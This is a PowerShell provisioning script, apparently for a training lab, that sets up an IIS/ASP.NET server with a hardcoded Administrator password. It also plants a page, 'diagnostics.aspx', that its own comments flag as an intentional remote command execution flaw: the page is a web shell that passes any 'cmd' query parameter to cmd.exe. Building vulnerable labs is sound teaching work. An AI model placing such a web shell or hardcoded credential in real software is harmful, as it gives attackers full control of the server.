param(
  [string]$AdminPassword = "BusinessLab#2026"
)
# App server .NET (Windows): IIS + ASP.NET + pagina .aspx de ejemplo.
Start-Transcript -Path C:\prov.log -Append
try {
  net user Administrator $AdminPassword
  Enable-NetFirewallRule -Name FPS-ICMP4-ERQ-In   # ping (echo ICMPv4) para el monitor
  Install-WindowsFeature -Name Web-Server,Web-Asp-Net45,NET-Framework-45-ASPNET -IncludeManagementTools
  $aspx = @"
<%@ Page Language='C#' %>
<html><head><title>App .NET</title></head>
<body style='font-family:Segoe UI;background:#2d1b3a;color:#f3e8ff;margin:2rem'>
<h1>Servicio de negocio (.NET / IIS)</h1>
<p>Host: <%= Environment.MachineName %></p>
<p>Fecha: <%= DateTime.Now %></p>
<p>Backend de aplicacion corporativa Windows.</p>
</body></html>
"@
  Set-Content -Path C:\inetpub\wwwroot\default.aspx -Value $aspx -Encoding UTF8

  # VULNERABILIDAD (ejecución remota de comandos): página de diagnóstico que ejecuta
  # cualquier comando recibido en el parámetro "cmd" con cmd.exe
  $diag = @'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>TAI Application Diagnostics</title>
<style>body{font-family:Segoe UI;background:#0B0F19;color:#F3F4F6;margin:2rem}
h1 span{color:#06B6D4} pre{background:#0F172A;border:1px solid #1E293B;padding:1rem;border-radius:6px;color:#34D399}</style></head>
<body>
<h1>TAI <span>Application Diagnostics</span></h1>
<p>Host: <%= Environment.MachineName %> &middot; Usage: ?cmd=command</p>
<%
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd + " 2>&1") { RedirectStandardOutput = true, UseShellExecute = false };
    var p = Process.Start(psi);
    string output = p.StandardOutput.ReadToEnd();
    p.WaitForExit();
    Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
  }
%>
</body>
</html>
'@
  Set-Content -Path C:\inetpub\wwwroot\diagnostics.aspx -Value $diag -Encoding UTF8
  Remove-Item C:\inetpub\wwwroot\iisstart.htm -ErrorAction SilentlyContinue
  "dotnet ready" | Out-File C:\prov.done
} catch { $_ | Out-File C:\prov.error }
Stop-Transcript
